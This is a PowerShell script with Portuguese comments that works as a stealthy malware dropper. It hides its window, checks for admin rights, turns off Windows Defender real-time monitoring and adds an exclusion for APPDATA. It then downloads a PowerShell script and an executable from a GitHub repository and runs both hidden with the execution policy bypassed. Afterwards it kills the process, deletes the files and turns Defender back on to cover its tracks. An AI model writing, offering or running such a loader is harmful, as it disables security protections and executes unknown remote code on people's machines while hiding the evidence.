# Esconder janela
$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
Add-Type -Name win -Member $t -Namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess()).MainWindowHandle, 0)

# Checar admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "Requer admin." ; exit 1
}

# Log
$log = "$env:TEMP\script_log.txt"
"$(Get-Date) - Iniciado" | Out-File $log -Append

# Desativar Defender
Set-MpPreference -DisableRealtimeMonitoring $true
"Defender off" | Out-File $log -Append

# Exclusão
Add-MpPreference -ExclusionPath "$env:APPDATA"
"Exclusão adicionada" | Out-File $log -Append

# Diretório
$dir = "$env:APPDATA\dump"
if (-not (Test-Path $dir)) { mkdir $dir }
cd $dir
"Dir criado" | Out-File $log -Append

# Baixar PS1 de exemplo e EXE
$ps1url = "https://raw.githubusercontent.com/user337666/brow666/refs/heads/main/sample.ps1"
$exeurl = "https://github.com/user337666/brow666/raw/refs/heads/main/awis.exe"
$ps1path = "$dir\sample.ps1"
$exepath = "$dir\awis.exe"
iwr $ps1url -o $ps1path
Unblock-File $ps1path -ea 0
iwr $exeurl -o $exepath
Unblock-File $exepath -ea 0
"Arquivos baixados" | Out-File $log -Append

# Executar PS1 e EXE
powershell -ExecutionPolicy Bypass -File $ps1path
sp $exepath -WindowStyle Hidden
"Executados" | Out-File $log -Append

# Aguardar, matar e limpar
Start-Sleep -Seconds 6
Stop-Process -Name awis -Force -ea 0
ri $ps1path, $exepath -Force
"Limpeza feita" | Out-File $log -Append

# Restaurar Defender
Set-MpPreference -DisableRealtimeMonitoring $false
"Defender on" | Out-File $log -Append

"Finalizado" | Out-File $log -Append
